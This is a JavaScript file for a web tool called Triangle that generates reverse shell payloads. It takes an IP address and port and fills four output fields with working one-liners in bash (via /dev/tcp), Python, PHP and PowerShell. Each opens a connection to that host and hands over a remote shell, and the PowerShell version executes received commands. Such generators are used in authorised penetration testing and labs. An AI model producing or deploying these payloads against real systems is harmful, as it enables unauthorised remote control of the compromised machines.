/*
 * Triangle - Payloads Page Logic
 * Author: Muhammad Shourov
 * Version: 1.0.0
 * This script handles the Reverse Shell Generator.
*/

document.addEventListener('DOMContentLoaded', () => {

    // --- Tool 1: Reverse Shell Generator ---
    const ipInput = document.getElementById('rs-ip');
    const portInput = document.getElementById('rs-port');
    const generateBtn = document.getElementById('rs-generate-btn');
    const outputContainer = document.getElementById('rs-output-container');
    
    // আউটপুট ফিল্ডগুলো
    const bashOutput = document.getElementById('rs-bash');
    const pythonOutput = document.getElementById('rs-python');
    const phpOutput = document.getElementById('rs-php');
    const powershellOutput = document.getElementById('rs-powershell');

    if (generateBtn) {
        generateBtn.addEventListener('click', () => {
            const ip = ipInput.value;
            const port = portInput.value;

            if (!ip || !port) {
                alert('Please enter both IP Address and Port.');
                return;
            }

            // Payloads
            bashOutput.value = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
            
            pythonOutput.value = `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`;
            
            phpOutput.value = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
            
            powershellOutput.value = `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;

            // ফলাফল দেখানোর জন্য কন্টেইনারটি দৃশ্যমান করা
            outputContainer.style.display = 'block';
        });
    }

}); // DOMContentLoaded End
